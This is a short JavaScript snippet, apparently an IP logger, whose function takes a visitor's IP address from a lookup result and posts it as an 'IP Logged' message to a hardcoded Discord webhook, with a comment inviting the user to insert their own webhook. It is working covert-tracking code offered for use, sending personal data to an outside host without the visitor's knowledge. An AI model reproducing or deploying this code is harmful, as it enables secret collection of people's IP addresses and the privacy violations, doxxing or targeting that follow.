function getIP(json) {
  var request = new XMLHttpRequest();
        const Hook = "https://discord.com/api/webhooks/981282340292677693/_T0_4su2iXuEtlVfKDReoeT9xSxYho8m8XeR0Z-0caoLFJ9Smnom0KZ_q1UruBKoLi6L"; // PUT UR WEBHOOK HERE
        var request = new XMLHttpRequest();
        request.open("POST", Hook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Discord IP Logger",
            embeds: [
                { "color": 7506394,
                "title": "IP Logged",
                "description": json.ip
            }]
        }
        request.send(JSON.stringify(params));
    }